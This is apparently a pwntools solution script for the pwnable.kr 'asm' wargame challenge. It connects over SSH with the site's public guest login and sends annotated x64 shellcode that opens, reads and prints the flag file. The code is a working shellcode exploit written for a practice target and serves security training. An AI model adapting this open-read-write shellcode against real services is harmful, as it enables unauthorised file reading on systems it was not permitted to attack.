from pwn import *

context.update(arch="amd64", os="linux", bits=64)
r = ssh(host="pwnable.kr", port=2222, user="asm", password="guest")
p = r.connect_remote("127.0.0.1", 9026)

shellcode = asm("""
        jmp filename
        open:
                pop rdi
                xor rsi, rsi
                xor rdx, rdx
                mov rax, 2
                syscall
        read:
                push rax
                pop rdi
                mov rdx, 0xff
                sub rsp, rdx
                mov rsi, rsp
                xor rax, rax
                syscall
        write:
                mov rdx, rax
                mov rdi, 1
                mov rsi, rsp
                xor rax, rax
                inc rax
                syscall
        exit:
                xor rdi, rdi    
                mov rax, 0x3c
                syscall
        filename:
                call open
                .ascii "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
                .byte 0
""")
p.recvuntil("give me your x64 shellcode:")
p.send(shellcode)
p.interactive()
p.close()

# intel syntax
# shellcode = asm("""
        # jmp filename

        # open:
        # ; 0x02
        # ; open(const char *pathname, int flags, mode_t mode)
                # pop rdi         ; pathname = &"./this_is_pwnable.kr_flag_file..."
                # xor rsi, rsi    ; flags = 0
                # xor rdx, rdx    ; mode  = 0
                # mov rax, 2
                # syscall
        # ; return fd of flag file in rax
        # read:
        # ; 0x00
        # ; read(int fd, void *buf, size_t count);
                # push rax
                # pop rdi         ; fd = whatever open() returned
                # mov rdx, 0xff   ; count = 0xff 
                # sub rsp, rdx    ; make room for the buffer
                # mov rsi, rsp    ; buf = top of the stack
                # xor rax, rax    
                # syscall
        # ; return number of bytes read in rax        
        # write:
        # ; 0x01
        # ; write(int fd, const void *buf, size_t count);
                # mov rdx, rax    ; count = whatever read() returned
                # mov rdi, 1      ; fd = 1 (stdout, so that we can see the flag)
                # mov rsi, rsp    ; buf = top of the stack
                # xor rax, rax    
                # inc rax
                # syscall
        # exit:
        # ; 0x3c
        # ; exit(int error_code);
                # xor rdi, rdi    ; error_code = 0    
                # mov rax, 0x3c
                # syscall
        # filename:
                # call open
                # .ascii "./this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
                # .byte 0
# """)

